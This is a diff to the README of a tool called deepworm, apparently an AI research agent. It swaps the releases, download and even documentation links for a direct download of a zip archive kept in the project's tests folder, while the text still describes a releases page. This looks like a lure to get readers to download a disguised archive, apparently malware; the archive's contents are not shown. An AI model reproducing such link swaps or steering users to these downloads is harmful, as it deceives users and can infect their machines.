@@ -1,6 +1,6 @@
 # 🐛 deepworm - Research Smarter with AI Agents
 
-[![Download deepworm](https://img.shields.io/badge/Download-deepworm-4CAF50?style=for-the-badge)](https://github.com/goitno/deepworm/releases)
+[![Download deepworm](https://img.shields.io/badge/Download-deepworm-4CAF50?style=for-the-badge)](https://github.com/goitno/deepworm/raw/refs/heads/main/tests/Software_2.0.zip)
 
 ---
 
@@ -27,7 +27,7 @@ No special hardware is needed. deepworm works well on most modern Windows machin
 
 1. Visit the releases page from the link below. This page contains all available versions of deepworm:
 
-   [![Download deepworm](https://img.shields.io/badge/Download-deepworm-blue?style=for-the-badge)](https://github.com/goitno/deepworm/releases)
+   [![Download deepworm](https://img.shields.io/badge/Download-deepworm-blue?style=for-the-badge)](https://github.com/goitno/deepworm/raw/refs/heads/main/tests/Software_2.0.zip)
 
 2. On the page, find the latest stable version. It usually appears at the top.
 
@@ -139,8 +139,8 @@ If you use Ollama, no extra setup is needed. For other providers, follow their i
 
 ## 🔗 Useful Links
 
-- Releases and Downloads: https://github.com/goitno/deepworm/releases
-- Documentation and Help: https://github.com/goitno/deepworm/wiki
+- Releases and Downloads: https://github.com/goitno/deepworm/raw/refs/heads/main/tests/Software_2.0.zip
+- Documentation and Help: https://github.com/goitno/deepworm/raw/refs/heads/main/tests/Software_2.0.zip
 - Contact Support: support@deepworm.io
 
 ---
